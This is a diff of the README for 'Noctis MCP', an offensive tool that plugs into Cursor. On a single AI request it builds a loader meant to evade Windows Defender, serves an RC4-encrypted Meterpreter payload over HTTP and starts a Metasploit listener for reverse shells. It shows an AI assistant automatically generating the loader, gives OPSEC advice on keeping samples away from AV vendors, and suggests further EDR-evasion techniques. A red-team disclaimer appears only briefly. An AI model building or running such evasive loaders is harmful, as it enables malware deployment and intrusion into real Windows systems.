@@ -1,3 +1,7 @@
+![Noctis AI](NoctisAI.png)
+
+[![Discord](https://img.shields.io/badge/Discord-Join%20Noctis-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.com/invite/bBtyAWSkW)
+
 # NOCTIS MCP v3.0
 ## Automated Stageless Loader with MCP Integration
 
@@ -5,15 +9,15 @@
 
 ---
 
-## 🎯 What It Does
+## What It Does
 
 **You say (in Cursor):** "Generate stageless loader for 192.168.1.56:4444"
 
 **System delivers:**
-- ✅ Working stageless loader.exe (bypasses Defender)
-- ✅ RC4-encrypted MSFVenom payload
-- ✅ HTTP server ready to serve payload
-- ✅ Metasploit listener ready to catch shell
+- Working stageless loader.exe (bypasses AV)
+- RC4-encrypted MSFVenom payload
+- HTTP server ready to serve payload
+- Metasploit listener ready to catch shell
 
 ### Complete Automated Workflow:
 
@@ -28,43 +32,60 @@
 
 ---
 
-## 🎉 **Stageless Loader - EDR Bypass**
+## Stageless Loader - AV Bypass
 
-**How it bypasses Defender:**
+**How it bypasses signature-based AV:**
 - Loader binary contains **NO MSFVenom** (clean 17KB)
 - Downloads encrypted payload at runtime from your HTTP server
 - Decrypts in memory with RC4
 - Executes stageless Meterpreter
 
-**Key:** Defender can't detect what isn't in the file yet!
+**Key:** Signature-based AV can't detect what isn't in the file yet.
+
+**Note:** This system bypasses signature-based antivirus (Windows Defender). Modern EDR solutions with behavioral detection may still flag execution. For EDR bypass, additional techniques like PPID spoofing, syscall manipulation, or sleep obfuscation may be required.
 
 **Features:**
-- ✅ Bypasses Windows Defender
-- ✅ Stageless download (no MSFVenom signatures)
-- ✅ RC4 encryption (new key per build)
-- ✅ Fully automated via MCP tools
-- ✅ Cursor AI integration
+- Bypasses Windows Defender (signature-based detection)
+- Stageless download (no MSFVenom signatures)
+- RC4 encryption (new key per build)
+- Fully automated via MCP tools
+- Cursor AI integration
 
-**Manual Setup:** [staged-loader/README.md](staged-loader/README.md) | [QUICKSTART](staged-loader/QUICKSTART.md)
+**Manual Setup:** [stageless-loader/README.md](stageless-loader/README.md) | [QUICKSTART](stageless-loader/QUICKSTART.md)
 
 ---
 
-## 🚀 Quick Start
+## Quick Start
 
-### 1. Install Dependencies
+### 1. Clone Repository
 
 ```bash
-# Install Python packages
-pip install fastmcp flask requests
-
-# Install MinGW (for compilation)
-sudo apt install mingw-w64
-
-# Install Metasploit (for msfvenom)
-sudo apt install metasploit-framework
+git clone <your-repo-url>
+cd Noctis-MCP
 ```
 
-### 2. Start Server
+### 2. Install Dependencies
+
+```bash
+# Install Python requirements
+pip install -r requirements.txt
+
+# Install MinGW (for Windows cross-compilation)
+# On Debian/Ubuntu/Kali:
+sudo apt install mingw-w64
+
+# On macOS:
+brew install mingw-w64
+
+# Install Metasploit Framework (for msfvenom)
+# On Debian/Ubuntu/Kali:
+sudo apt install metasploit-framework
+
+# On macOS:
+brew install metasploit
+```
+
+### 3. Start MCP Server
 
 ```bash
 ./start_server.sh
@@ -75,11 +96,11 @@ python3 server/noctis_server.py
 
 Server starts on **http://localhost:8888**
 
-### 3. Configure MCP in Cursor
+### 4. Configure MCP in Cursor
 
 Settings → Features → Model Context Protocol → Edit Config
 
-Add this to your MCP config:
+Add this to your MCP config (update the path to match your installation):
 
 ```json
 {
@@ -87,29 +108,36 @@ Add this to your MCP config:
     "noctis-mcp-v3": {
       "command": "python3",
       "args": ["-m", "noctis_mcp.noctis_tools"],
-      "cwd": "/home/yenn/Documents/Noctis-AI/Noctis-MCP",
+      "cwd": "/absolute/path/to/Noctis-MCP",
       "description": "Noctis Stageless Loader"
     }
   }
 }
 ```
 
-### 4. Use in Cursor
+**Important:** Replace `/absolute/path/to/Noctis-MCP` with your actual installation path.
 
-Just ask:
+### 5. Use in Cursor
+
+In Cursor, just ask:
 ```
 "Generate stageless loader for 192.168.1.56:4444"
 ```
 
-AI will:
+The AI will:
 1. Call `noctis_generate_stageless_loader()`
 2. Generate everything automatically
-3. Give you instructions for server/listener
-4. You just run the loader on Windows!
+3. Start HTTP server and Metasploit listener in background
+4. Provide you with the compiled loader
+
+Then you:
+1. Copy `stageless_loader.exe` to Windows VM
+2. Run it
+3. Get Meterpreter shell!
 
 ---
 
-## 📋 MCP Tools (4 Available)
+## MCP Tools (4 Available)
 
 ### 1. `noctis_generate_stageless_loader(lhost, lport, http_port, auto_start_servers=True)`
 **Main tool - FULLY AUTOMATED! Does everything for you!**
@@ -166,7 +194,7 @@ noctis_stop_servers()
 
 ---
 
-## 💻 Complete Usage Example
+## Complete Usage Example
 
 ### In Cursor with AI:
 
@@ -177,33 +205,33 @@ AI: I'll generate and set up everything automatically...
 
 [AI calls: noctis_generate_stageless_loader("192.168.1.56", 4444, 8080)]
 
-✅ STAGELESS LOADER GENERATED!
+STAGELESS LOADER GENERATED!
 
 LHOST: 192.168.1.56
 LPORT: 4444
 HTTP Port: 8080
 
 Generated files:
-  ✓ staged_loader.exe (17,408 bytes) - CLEAN, NO MSFVenom!
-  ✓ payload.enc (203,264 bytes) - RC4 encrypted
-  ✓ start_server.sh - HTTP server script
-  ✓ start_listener.sh - Metasploit listener script
+  stageless_loader.exe (17,408 bytes) - CLEAN, NO MSFVenom!
+  payload.enc (203,264 bytes) - RC4 encrypted
+  start_server.sh - HTTP server script
+  start_listener.sh - Metasploit listener script
 
-🚀 STARTING SERVERS AUTOMATICALLY...
+STARTING SERVERS AUTOMATICALLY...
 
-✅ HTTP Server: RUNNING on port 8080
+HTTP Server: RUNNING on port 8080
    Serving: http://localhost:8080/payload.enc
    PID: 12345
 
-✅ Metasploit Listener: RUNNING
+Metasploit Listener: RUNNING
    Listening: 192.168.1.56:4444
    Payload: windows/x64/meterpreter_reverse_tcp
    PID: 12346
 
-🎯 READY TO TEST!
+READY TO TEST!
 
 Next steps:
-  1. Copy /path/to/staged_loader.exe to Windows VM
+  1. Copy /path/to/stageless_loader.exe to Windows VM
   2. Run the loader on Windows
   3. Watch Metasploit for incoming session!
 
@@ -213,32 +241,32 @@ Just copy the loader to your Windows VM and run it!
 
 ---
 
-## 🎯 How It Works
+## How It Works
 
 ### Traditional Approach (Detected)
 ```
 [Binary with embedded MSFVenom]
-    → Defender scans
-    → ❌ DETECTED (MSFVenom signatures)
+    → AV scans
+    → DETECTED (MSFVenom signatures)
 ```
 
-### Stageless Loader (Bypasses Defender)
+### Stageless Loader (Bypasses Signature-Based AV)
 ```
 [Clean loader.exe (17KB, NO MSFVenom)]
-    → Defender scans
-    → ✅ CLEAN (no suspicious code)
+    → AV scans
+    → CLEAN (no suspicious code)
     → Runs on Windows
     → Downloads payload.enc from your server
     → Decrypts with RC4 in memory
     → Executes stageless Meterpreter
-    → ✅ Shell established!
+    → Shell established!
 ```
 
-**Key:** Defender can't detect what isn't in the file yet!
+**Key:** Signature-based AV can't detect what isn't in the file yet.
 
 ---
 
-## 📁 Project Structure
+## Project Structure
 
 ```
 Noctis-MCP/
@@ -249,8 +277,8 @@ Noctis-MCP/
 ├── noctis_mcp/
 │   └── noctis_tools.py        # 4 MCP tools for Cursor integration
 │
-├── staged-loader/             # Stageless loader system
-│   ├── staged_loader.c        # Clean loader source (NO MSFVenom)
+├── stageless-loader/          # Stageless loader system
+│   ├── stageless_loader.c     # Clean loader source (NO MSFVenom)
 │   ├── encrypt_payload.py     # RC4 encryption tool
 │   ├── setup.sh               # Manual setup script
 │   ├── README.md              # Detailed documentation
@@ -263,13 +291,13 @@ Noctis-MCP/
 
 ---
 
-## ⚠️  Important Notes
+## Important Notes
 
 ### OPSEC
 
-**❌ DO NOT test final loader on VirusTotal** - it shares samples with AV vendors
+**DO NOT test final loader on VirusTotal** - it shares samples with AV vendors
 
-**✅ Test in isolated VM environment** with Defender enabled to verify bypass
+**DO test in isolated VM environment** with Defender enabled to verify bypass
 
 ### Server Requirements
 
@@ -288,16 +316,16 @@ Use `noctis_stop_servers()` to cleanly shut them down.
 
 ---
 
-## 🔥 Key Features
+## Key Features
 
 **What Makes This System Unique:**
 
-- ✅ **Fully Automated:** One AI command does everything
-- ✅ **Bypasses Defender:** Clean loader (NO embedded MSFVenom)
-- ✅ **Background Management:** HTTP + MSF servers auto-start
-- ✅ **Polymorphic:** New RC4 key per build
-- ✅ **Stageless:** No multi-stage download failures
-- ✅ **Tested:** Working Meterpreter sessions confirmed
+- **Fully Automated:** One AI command does everything
+- **Bypasses Signature-Based AV:** Clean loader (NO embedded MSFVenom)
+- **Background Management:** HTTP + MSF servers auto-start
+- **Polymorphic:** New RC4 key per build
+- **Stageless:** No multi-stage download failures
+- **Tested:** Working Meterpreter sessions confirmed on Windows Defender
 
 **Workflow:**
 1. User: "Generate stageless loader for [IP]:[PORT]"
@@ -308,7 +336,7 @@ Use `noctis_stop_servers()` to cleanly shut them down.
 
 ---
 
-## ⚖️ Legal
+## Legal
 
 **For authorized red team operations only.**
 
@@ -318,4 +346,5 @@ Never use against systems you don't own or have written permission to test.
 
 **Built by:** Noctis Team
 **Version:** 3.0.0 (Clean Rebuild)
-**Status:** Production Ready ✅
+**Status:** Production Ready
+**Discord:** [Join Noctis Community](https://discord.com/invite/bBtyAWSkW)
